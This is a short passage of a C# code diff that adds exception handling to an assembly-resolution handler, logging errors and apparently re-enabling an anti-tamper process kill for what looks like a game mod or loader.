+                    throw new InvalidOperationException($"Win32Exception occurred during assembly resolution: {ex.Message}", ex);
+                }
+                catch (TypeLoadException ex)
+                {
+                    CustomConsole.Error($"TypeLoadException: {ex.Message}");
+                    CustomConsole.Error($"Stack Trace: {ex.StackTrace}");
+                    // Handle specific issues with loading types from the assembly
+                    throw new InvalidOperationException($"TypeLoadException occurred during assembly resolution: {ex.Message}", ex);
+                }
+                catch (Exception ex)
+                {
+                    CustomConsole.Error($"Error during assembly resolution: {ex.Message}");
+                    CustomConsole.Error($"Stack Trace: {ex.StackTrace}");
 
-            //        Process.GetCurrentProcess().Kill();
-            //        CallThrowException(OnGameInit.anti2);
+                    Process.GetCurrentProcess().Kill();
+                    CallThrowException(OnGameInit.anti2);
 
-            //        throw new InvalidOperationException($"Error during assembly resolution: {ex.Message}", ex);
-            //    }
-            //};
+                    throw new InvalidOperationException($"Error during assembly resolution: {ex.Message}", ex);
+                }
+            };
         }
     }
 
